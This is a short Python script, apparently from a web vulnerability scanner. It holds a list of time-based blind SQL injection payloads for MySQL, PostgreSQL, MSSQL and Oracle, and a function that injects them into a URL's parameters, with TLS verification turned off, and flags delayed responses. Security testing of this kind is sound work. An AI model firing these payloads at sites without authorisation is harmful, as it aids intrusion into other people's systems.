import requests
import time

# Time-based blind SQL injection payloads
TIME_PAYLOADS = {
    "mysql": [
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "1' AND SLEEP(5)#",
    ],
    "postgresql": [
        "'; SELECT pg_sleep(5)--",
        "' OR pg_sleep(5)--",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR WAITFOR DELAY '0:0:5'--",
    ],
    "oracle": [
        "' AND DBMS_LOCK.SLEEP(5)--",
        "' OR DBMS_LOCK.SLEEP(5)--",
    ]
}

def test_blind_sqli(url, params, delay=5):
    """Test time-based blind SQL injection."""
    results = []
    
    for param in params:
        for db_type, payloads in TIME_PAYLOADS.items():
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                try:
                    start = time.time()
                    response = requests.get(url, params=test_params, timeout=delay+5, verify=False)
                    elapsed = time.time() - start
                    
                    # Jika response delay sesuai dengan SLEEP time
                    if elapsed >= delay:
                        results.append({
                            "type": "Blind SQL Injection (Time-based)",
                            "severity": "CRITICAL",
                            "param": param,
                            "payload": payload,
                            "detail": f"Response delay: {elapsed:.2f}s (expected: {delay}s) - {db_type.upper()}"
                        })
                        return results  # Stop setelah ketemu
                except requests.RequestException:
                    pass
    
    return results
